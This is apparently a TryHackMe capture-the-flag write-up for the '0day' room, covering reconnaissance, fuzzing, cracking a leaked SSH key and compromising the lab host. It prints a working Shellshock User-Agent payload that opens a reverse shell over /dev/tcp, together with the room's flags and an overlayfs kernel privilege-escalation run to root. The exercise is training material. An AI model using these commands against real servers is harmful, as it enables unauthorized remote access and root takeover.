TryHackMe Room
## Desc
Root my secure Website, take a step into the history of hacking.

## Recon
```
❯ rustscan --ulimit=5000 --range=1-65535 -a 10.10.162.148 -- -sV
Open 10.10.162.148:22
Open 10.10.162.148:80


❯ nmap -sC -sV -Pn -p80 $ip
Nmap scan report for 10.10.162.148
Host is up (0.87s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
```
## Fuzz
I will fuzz the website

```
❯ ffuf -u "http://10.10.162.148/FUZZ" -w /usr/share/wordlists/dirb/common.txt
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 755ms]
.hta                    [Status: 403, Size: 284, Words: 21, Lines: 11, Duration: 769ms]
.htaccess               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 880ms]
.htpasswd               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 879ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 758ms]
backup                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 891ms]
cgi-bin                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 964ms]
cgi-bin/                [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 964ms]
css                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 805ms]
img                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 1174ms]
index.html              [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 1190ms]
js                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 853ms]
robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2, Duration: 1047ms]
secret                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 835ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 797ms]
uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 975ms]
```
A lot of directory, so i will visite them
In the backup i found. I will view source
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----

```
on the secret i found 
`http://10.10.162.148/secret/turtle.png`
i will download and do steg on it
```
❯ zsteg -a turtle.png
[=] nothing :(   
```
oh nothing.
Now visit http://10.10.162.148/uploads/ and also nothing.

Now what i will do is to enum on the `cgi-bin`
## Second Fuzz
```
❯ ffuf -u "http://10.10.162.148/cgi-bin/FUZZ" -w /usr/share/wordlists/dirb/common.txt

 :: Method           : GET
 :: URL              : http://10.10.162.148/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 800ms]
.htaccess               [Status: 403, Size: 297, Words: 21, Lines: 11, Duration: 800ms]
.htpasswd               [Status: 403, Size: 297, Words: 21, Lines: 11, Duration: 805ms]
.hta                    [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 964ms]
:: Progress: [4614/4614] :: Job [1/1] :: 45 req/sec :: Duration: [0:02:49] :: Errors: 2 ::

```
My second give me nothing, so i will now focus on the private key id_rsa. i will try to crack it

```
❯ /usr/share/john/ssh2john.py id_rsa| tee -a ssh.hash
❯ john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (?)     
1g 0:00:00:00 DONE (2023-12-01 18:04) 2.857g/s 1462p/s 1462c/s 1462C/s teiubesc..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Cracked.
I tried to loggin on user `0day` and `Ryan` but nothing.
Now what i will do is to fuzz with my `cgi-bin` wordlist
```
❯ ffuf -u "http://10.10.162.148/FUZZ" -w /usr/share/wordlists/Seclists/top-cgi.txt
?mod=node&nid=some_thing&op=view [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 782ms]
?mod=some_thing&op=browse [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 787ms]
/                       [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 788ms]
?Open                   [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 763ms]
?OpenServer             [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 759ms]
%2e/                    [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 789ms]
?mod=<script>alert(document.cookie)</script>&op=browse [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 755ms]
?sql_debug=1            [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 1009ms]
admin/                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 757ms]
//                      [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 805ms]
cgi-bin/                [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 830ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 915ms]
?PageServices           [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 912ms]
?wp-cs-dump             [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 910ms]
backup/                 [Status: 200, Size: 1767, Words: 9, Lines: 32, Duration: 936ms]
css                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 730ms]
img/                    [Status: 200, Size: 935, Words: 61, Lines: 17, Duration: 791ms]
js                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 787ms]
secret/                 [Status: 200, Size: 109, Words: 2, Lines: 9, Duration: 1022ms]
cgi-bin/test.cgi        [Status: 200, Size: 13, Words: 2, Lines: 2, Duration: 769ms]
cgi-bin/.htaccess       [Status: 403, Size: 297, Words: 21, Lines: 11, Duration: 1137ms]
cgi-bin/.htaccess.old   [Status: 403, Size: 301, Words: 21, Lines: 11, Duration: 1128ms]
cgi-bin/.htaccess~      [Status: 403, Size: 298, Words: 21, Lines: 11, Duration: 1113ms]
cgi-bin/.htpasswd       [Status: 403, Size: 297, Words: 21, Lines: 11, Duration: 1114ms]
.htpasswd               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 1259ms]
.htaccess               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 1218ms]
icons/                  [Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 885ms]
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 1058ms]
cgi-bin/.htaccess.save  [Status: 403, Size: 302, Words: 21, Lines: 11, Duration: 7788ms]
?pattern=/etc/*&sort=name [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 848ms]
?D=A                    [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 913ms]
?N=D                    [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 929ms]
?M=A                    [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 931ms]
?S=A                    [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 941ms]
?\"><script>alert('Vulnerable');</script> [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 749ms]

```
Hmm Good.
i have this 200
```
cgi-bin/test.cgi        [Status: 200, Size: 13, Words: 2, Lines: 2, Duration: 769ms]

```
i will confirm if it's vulnerable now
```
❯ nmap  $ip -sV -p80 --script=http-shellshock.nse --script-args uri=/cgi-bin/test.cgi
Host is up (1.1s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.4.26.216/1337 0>&1' http://10.10.125.61/cgi-bin/test.cgi

❯ sudo rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.4.26.216] from (UNKNOWN) [10.10.162.148] 56924
bash: cannot set terminal process group (851): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/usr/lib/cgi-bin$ 
```
Got a shell
```
www-data@ubuntu:/home$ ls
ls
ryan
www-data@ubuntu:/home$ cd ryan
cd ryan
www-data@ubuntu:/home/ryan$ ls
ls
user.txt
www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{Sh3llSh0ck_r0ckz}
www-data@ubuntu:/home/ryan$ 
```

## Escalation
found a user ryan.
I think the last RSA will work. But not work
```
www-data@ubuntu:/home/ryan$ uname -a
name -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/home/ryan$ 
```
search for exploit
```
❯ searchsploit ubuntu 3.13.0-32
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)            | linux/local/37293.txt
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                               | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                      | linux/local/31346.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                 | linux/dos/43234.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                        | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                               | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                    | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)            | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                               | linux/local/41760.txt
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
it's vulnerable to OverlayFs. but my exploit not work
```
Linux ubuntu 3.13.0-32-generic
```
I copy this and past on google, i found 
https://www.exploit-db.com/exploits/37292

```
www-data@ubuntu:/tmp$ chmod +x ofs
chmod +x ofs
www-data@ubuntu:/tmp$ ./ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
root.txt
# cat root.txt
THM{g00d_j0b_0day_is_Pleased}
# 
```